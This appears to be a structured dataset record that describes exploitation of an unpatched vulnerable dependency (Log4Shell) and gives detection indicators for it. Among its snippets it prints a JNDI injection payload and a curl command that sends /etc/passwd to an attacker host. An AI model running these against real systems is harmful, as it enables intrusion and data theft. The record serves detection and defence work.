package_info.package_versions: Known, high-severity vulnerable version (e.g., pre-patch Log4j)
package_info.why_malicious: The package contains a known, high-severity vulnerability that was not patched. Attackers exploited this vulnerability to gain unauthorized access, exfiltrate sensitive data, and maintain persistence. The use of this vulnerable component in production software without timely patching or monitoring enabled a major data breach.

execution_context.file_location: core application code (via vulnerable framework usage)

malicious_snippets.code_snippet: Attacker sends a specially crafted payload to the application, exploiting the vulnerable framework (e.g., Log4Shell: ${jndi:ldap://attacker.com/a})
malicious_snippets.code_language: varies (Java for Log4j, but could be any language depending on the framework)
malicious_snippets.code_behavior: Executes remote code or exfiltrates environment variables and secrets by leveraging the vulnerable framework's unsafe input handling.

malice_analysis.why_suspicious: The code path allows untrusted user input to trigger remote lookups or code execution, which is not expected in normal application logic.
malice_analysis.violated_expectations: Normal frameworks should not allow user-supplied data to trigger network lookups or code execution. This violates the principle of least privilege and safe input handling.
malice_analysis.similar_legitimate_use: JNDI lookups or dynamic code loading may be legitimate in controlled, internal admin tools, but never with untrusted user input.
key_indicators: User input directly triggers network requests or code execution
Use of dynamic lookup patterns (e.g., ${jndi:...}) in logs or configuration
Unexpected outbound network connections from application servers

malicious_snippets.code_snippet: Attacker uses remote code execution to run commands like: curl -X POST -d @/etc/passwd http://attacker.com/upload
malicious_snippets.code_language: shell (executed via RCE in the application)
malicious_snippets.code_behavior: Exfiltrates sensitive files (e.g., /etc/passwd, application secrets, customer data) to attacker-controlled infrastructure.

malice_analysis.why_suspicious: Application servers should never initiate outbound data transfers of sensitive files to unknown domains.
malice_analysis.violated_expectations: Normal application behavior does not include arbitrary file reads and network exfiltration triggered by user input.
malice_analysis.similar_legitimate_use: Automated backups or telemetry uploads to trusted endpoints, but never to untrusted, attacker-controlled domains.
key_indicators: Outbound HTTP/S requests to unknown or suspicious domains
Access to sensitive files not required for normal operation
Execution of shell commands from within application context

attack_chain.action: Attacker identifies and targets the vulnerable framework in the application.
attack_chain.leads_to: Initial exploitation and remote code execution

attack_chain.action: Attacker leverages RCE to access sensitive files and environment variables.
attack_chain.leads_to: Exfiltration of credentials and customer data

attack_chain.action: Attacker exfiltrates data to external infrastructure, covering tracks to avoid detection.
attack_chain.leads_to: Data breach, regulatory and legal consequences

behavioral_signatures: Unexpected outbound network requests from application servers
Execution of shell commands or scripts from within application processes
Access to sensitive files (e.g., /etc/passwd, application secrets) outside normal application logic
Presence of known exploit payloads in logs or input fields (e.g., ${jndi:ldap://...})
file_indicators: Application logs containing suspicious lookup patterns
Temporary files or scripts created by attacker payloads
Unusual modifications to application configuration files
network_indicators: Outbound connections to known malicious or untrusted domains
Unusual data transfer volumes to external IPs
Connections to attacker infrastructure (e.g., webhook.site, pastebin, custom C2 servers)
detection_knowledge.how_to_detect: Monitor application logs for exploit patterns (e.g., JNDI lookups), alert on unexpected outbound network connections, and audit file access for sensitive data. Implement runtime application self-protection (RASP) and use software composition analysis (SCA) tools to detect known vulnerable components. Regularly update dependency inventories and patch high-severity vulnerabilities immediately.
